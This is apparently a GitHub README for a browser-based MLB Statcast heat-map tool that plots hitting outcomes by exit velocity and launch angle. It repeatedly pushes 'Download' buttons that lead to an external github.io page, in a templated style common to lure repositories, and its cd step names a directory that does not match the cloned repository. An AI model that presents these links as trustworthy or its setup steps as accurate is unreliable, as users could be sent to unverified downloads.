# EV Launch Angle Heat Map v2026 - interactive sports analytics tool 2026

> **Explore Statcast hitting data directly in your browser.** EV Launch Angle Heat Map is a web-based MLB visualization that shows batting average, slugging percentage, and home run rate across exit velocity and launch angle. This edition is presented as the 2026 release.

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/owen-westiyz3960/ev-launch-angle-heatmap-2026?style=flat-square)](https://github.com/owen-westiyz3960/ev-launch-angle-heatmap-2026)

---

<p align="center">
  <a href="https://owen-westiyz3960.github.io/ev-launch-angle-heatmap-2026/">
    <img src="https://img.shields.io/badge/Download-EV%20Launch%20Angle%20Heat%20Map%20Latest-brightgreen?style=for-the-badge" alt="Download EV Launch Angle Heat Map">
  </a>
</p>

> **[Download EV Launch Angle Heat Map v2026](https://owen-westiyz3960.github.io/ev-launch-angle-heatmap-2026/)**

---

[Download Latest Build](https://owen-westiyz3960.github.io/ev-launch-angle-heatmap-2026/)

---

## What the Tool Does

EV Launch Angle Heat Map provides a focused browser interface for analyzing Statcast batting results. Its visualization maps outcomes over the available exit velocity and launch angle ranges, making it easier to see how contact characteristics relate to batting average, slugging percentage, and home run rate.

Analysts, coaches, and baseball supporters can use the report to compare an individual player or a team with league-wide results. Heat-map overlays, distribution histograms, and league-average reference data provide additional context for interpreting hitting trends without working through raw data alone.

---

## Included Capabilities

- Explore Statcast results through an interactive exit velocity and launch angle heat map
- Place a player overlay on the map to examine an individual batter
- Add a team overlay for club-level analysis
- Filter results by year or season
- Compare selected results with the league average
- View outcome distributions through histograms
- Switch between batting average, slugging percentage, and home run rate
- Use a standalone HTML report that can be viewed and shared independently

---

## Getting Started

1. Clone the repository or download its contents:
   ```bash
   git clone https://github.com/owen-westiyz3960/ev-launch-angle-heatmap-2026.git
   ```

2. Enter the project directory:
   ```bash
   cd ev-la-heatmap
   ```

3. Open the primary HTML file from the project directory in a modern web browser.

For local hosting, place the directory behind any static web server and visit the report through the browser.

---

## Working with the Heat Map

- Load the report in your browser.
- Select the statistic you want to examine, including BA, SLG, or HR rate.
- Use the year control to limit the displayed data to a season.
- Turn on a player or team overlay when you want to inspect a particular subject.
- Use league average as the comparison reference.
- Consult the histograms for more detail about the distributions represented by the map.

### Sample Analysis

1. Choose the season of interest.
2. Set the displayed metric to slugging percentage.
3. Enable a player overlay.
4. Compare that player's contact profile with the league-average view.
5. Replace the player overlay with the team overlay to examine the broader club profile.

---

## Configuration

The primary report is self-contained, so its behavior and embedded settings are generally managed within the HTML file. When editable filters or default values are provided, adjust them in the report or in the associated script assets.

A representative configuration can look like this:

```json
{
  "metric": "SLG",
  "year": 2026,
  "overlay": "player",
  "comparison": "league_average"
}
```

---

## System Requirements

- A current web browser with support for modern HTML, CSS, and JavaScript
- The included self-contained HTML report
- MLB Statcast-based data embedded in or loaded by the report
- A local static server if you choose to serve the directory rather than open the HTML file directly

---

## Frequently Asked Questions

**Where can I find the current build?**  
Follow the download link above to open or obtain the latest version.

**Are both player and team comparisons available?**  
Yes. Separate overlays are provided for individual players and teams.

**Can the report be limited to one season?**  
Yes. Use the year filter to select the season you want to analyze.

**Which hitting metrics are available?**  
You can view batting average, slugging percentage, and home run rate.

**What should I check when the report fails to load?**  
Open the browser console, verify that the HTML report and its related assets are available, and confirm that the browser is up to date.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
